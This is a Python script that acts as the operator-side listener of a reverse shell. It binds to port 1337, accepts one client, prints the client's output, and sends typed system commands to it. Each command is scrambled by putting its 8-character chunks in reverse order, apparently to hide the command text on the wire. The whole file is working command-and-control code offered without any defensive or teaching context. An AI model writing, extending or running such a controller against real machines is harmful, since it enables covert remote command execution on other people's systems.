from threading import Thread
import socket
from time import sleep
import sys


#  Create socket (allows two computers to connect)
def socket_create():
    try:
        global host
        global port
        global s
        host = '127.0.0.1'  # the server doesn't need to know the ip, only the client
        port = 1337
        s = socket.socket()
    except socket.error as msg:
        print('Socket creation error', str(msg))


# Bind socket to port and wait for connection from client
def socket_bind():
	try:
		global host
		global port
		global s
		print('Binding socket to port: ' + str(port))
		s.bind((host, port))
		s.listen(5)
	except socket.error as msg:
			
		print('Socket binding error', str(msg) + '\n' + 'Retrying...')
		sleep(5)
		socket_bind()


# Establish a connection with client (socket must be listening for them)
def socket_accept():
	conn, address = s.accept()
	print('Connection has been established | ' + 'IP ' + address[0] + ' | Port ' + str(address[1]))
	x = Thread(target=recv_command_res, args=(conn,), daemon=True)
	x.start()
	send_commands(conn)
	conn.close()

# Receives commands 
def recv_command_res(conn):
    while True:
        print(conn.recv(1024))#client_response = str(conn.recv(1024), 'utf-8')#print(client_response, end='')


#  Send commands
def send_commands(conn):
    while True:
        cmd = input('')
        if cmd == 'exit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:  # system commands are bytes and not strings
            i = 1
            reversed_cmd = ""
            tmp_cmd = ""
            cmd_list = []
            for char in cmd:
                tmp_cmd += char
                if i % 8 == 0:
                    cmd_list.insert(0, tmp_cmd)
                    tmp_cmd = ""
                i += 1
            tmp_len = 8 - len(tmp_cmd)
            cmd_list.insert(0, tmp_cmd + '\n'*tmp_len)
            for cmd_string in cmd_list:
                reversed_cmd += cmd_string
            conn.send(str.encode(reversed_cmd+'\x04'))
            


def main():
    socket_create()
    socket_bind()
    socket_accept()

main()